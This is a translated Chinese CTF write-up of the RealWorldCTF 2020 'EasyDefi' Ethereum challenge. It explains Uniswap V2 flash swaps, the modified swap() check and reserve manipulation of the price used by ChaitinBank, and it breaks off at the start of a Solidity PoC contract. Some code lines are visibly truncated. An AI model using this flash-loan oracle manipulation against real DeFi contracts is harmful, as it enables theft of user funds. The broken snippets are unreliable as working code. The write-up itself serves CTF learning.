# RealWorldCTF 2020 以太坊题目两则：EasyDefi & Re:Montagy
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
RealWorld CTF 两道以太坊智能合约题目的事后复现。
## EasyDefi
本题模拟的是 DeFi 生态的闪电贷，关于 DeFi 和闪电贷的知识不多介绍，参考上图可以看出本题主要基于 UniswapV2
的架构进行修改，所以这里简单介绍一下 Uniswap 的闪电贷机制。
> UniswapV2版本上线了闪电贷[FlashSwap](https://uniswap.org/docs/v2/smart-contract-> integration/using-flash-> swaps/)的功能，该功能允许任何人在调用任意pair合约的swap方法时，可以先从Uniswap的交易池中借出一定数量的代币，从其他合约中进行套利，随后给pair返还足够的代币，最终实现近乎0成本的套利行为。
###  swap
我们可以调用一个 pair 合约的 swap 方法，从中借出一定数目的 token0 和 token1，然后将借出的 token0 和 token1
到另一个汇率不同的市场上卖出，再归还之前借出的 token0 和 token1，剩余的 token0 和 token1 即为本次交易的套利收益。
    // 表示从 pair 合约中借出 10 个 Token0，0 个 Token1，然后套利合约的地址是 flashSwapAddr，data 是传递的参数
    swap(10, 0, flashSwapAddr, data)
###  套利合约
套利合约即完成 “将借出的 token0 和 token1 到另一个汇率不同的市场上卖出，再归还之前借出的 token0 和 token1”
这一步的合约实现，它实现了 UniswapV2 所定义的如下接口，以供 UniswapV2Pair 在进行 swap 时对外部合约进行调用：
    interface IUniswapV2Callee {
        function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
    }
本题中对应的实现分别是 `ChaitinPair` 和 `IChaitinCallee`：
    interface IChaitinCallee {
        function ChaitinCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
    }
    contract ChaitinPair is IChaitinPair, ChaitinERC20 {
        // 省略其他
            function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
            require(amount0Out > 0 || amount1Out > 0, 'Chaitin: INSUFFICIENT_OUTPUT_AMOUNT');
            (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
            require(amount0Out  0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
            if (data.length > 0) IChaitinCallee(to).ChaitinCall(msg.sender, amount0Out, amount1Out, data);
            balance0 = IERC20(_token0).balanceOf(address(this));
            balance1 = IERC20(_token1).balanceOf(address(this));
            }
            uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; 
            uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
            require(amount0In > 0 || amount1In > 0, 'Chaitin: INSUFFICIENT_INPUT_AMOUNT');
            { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
            uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(25));
            uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(25));
            require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Chaitin: K');
            }
            _update(balance0, balance1, _reserve0, _reserve1);
            emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
        }
    }
###  解题
回到题目，根据题目中的代码信息在 GitHub 可以搜到另一份非常类似的代码
直接对比两份代码，可以看到从 `PokeFactory.sol` 到 `ChaitinFactory.sol` 在 `swap()` 函数处有很明显的修改：
这也就意味着，当我们通过 `swap()` 借出 Token 时，可以通过套利合约归还比借出数目更少的 Token 进而获利。
回到 `ChaitinBank` 合约，根据题目的需求，我们需要获得超过 80 的 FlagToken，但我们通过 swap 只能获得
FeiToken，因此需要通过 `depositFeiCointoFlag()` 将 FeiToken 转换成 FlagToken，而兑换比例由
`calcFeiCoinValue()` 决定。
    contract ChaitinBank {
        using SafeMath for uint256;
        address public feicoin;
        address public owner;
        IERC20 public flagToken;
        address public chaitinFeifeiTokenPair;
        address public chaitinSwap;
        uint256 public CTTperFlag;
        constructor(address _feicoin, address _owner, address _flagToken, address _chaitinFeifeiTokenPair, address _chaitinSwap, uint256 _CTTperFlag) public {
            feicoin = _feicoin;
            flagToken = IERC20(_flagToken);
            owner = _owner;
            chaitinFeifeiTokenPair = _chaitinFeifeiTokenPair;
            CTTperFlag = _CTTperFlag;
            chaitinSwap = _chaitinSwap;
        }
        function calcFeiCoinValue() public view returns(uint256 value){
            (uint256 reserve0, uint256 reserve1, uint32 time ) = IPokePair(chaitinFeifeiTokenPair).getReserves(); //TODO:params
            address token0 = IPokePair(chaitinFeifeiTokenPair).token0();
            if(token0 == feicoin){
                value = IPokeRouter01(chaitinSwap).getAmountOut( 10, reserve0, reserve1);
            }else{
                value = IPokeRouter01(chaitinSwap).getAmountOut( 10, reserve1, reserve0);
            }
            return value;
        }
        // Enter the bank. Pay some feifeicoin. Earn some Flags.
        function depositFeiCointoFlag(uint256 _amount) public {
            IERC20(feicoin).transferFrom(msg.sender, address(this), _amount);
            uint256 valueOfFeicoin = calcFeiCoinValue(); // exchange feicoin to ChaitinCoin
            uint256 exceptFlagsAmount = valueOfFeicoin * ( _amount / 10 ) / CTTperFlag;
            uint256 flagsAmount = 0;
            if(exceptFlagsAmount  0, 'ChaitinLibrary: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'ChaitinLibrary: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(9975);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(10000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }
如果我们希望通过 FeiToken 尽可能多地兑换 FlagToken ，那么需要 `getAmountOut()` 返回的值尽可能大，因此需要保证
`reserveIn = _reserve0 * _reserve1 * (1000**2) # True
此时我们从 Pair 中获得了 98999999999999999999 FeiToken，如果全部用于兑换 FlagToken
的话，按照计算公式，`calcFeiCoinValue()` 返回的值是 997：
    reserveIn = balance0
    reserveOut = balance1
    amountIn = 10
    amountInWithFee = amountIn * 9975
    numerator = amountInWithFee * reserveOut
    denominator = reserveIn * 10000 + amountInWithFee
    amountOut = numerator / denominator # 997
在这个兑换条件下，我们将拥有的 FeiToken 全部转换为 FlagToken，即可满足题目要求。
按照思路，编写 poc：
    pragma solidity ^0.6.0;
    import './ChaitinBank.sol';
    interface IChaitinCallee {
        function ChaitinCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
    }
    contract Solve is IChaitinCallee  {
        IERC20 chaitinToken;
        IERC20 feiToken;
        IERC20 flagToken;
        ChaitinBank bank;
        IPokePair pair;
        constructor(address _chaitinToken, address _feiToken, address _flagToken, address _bank, address _pair) public {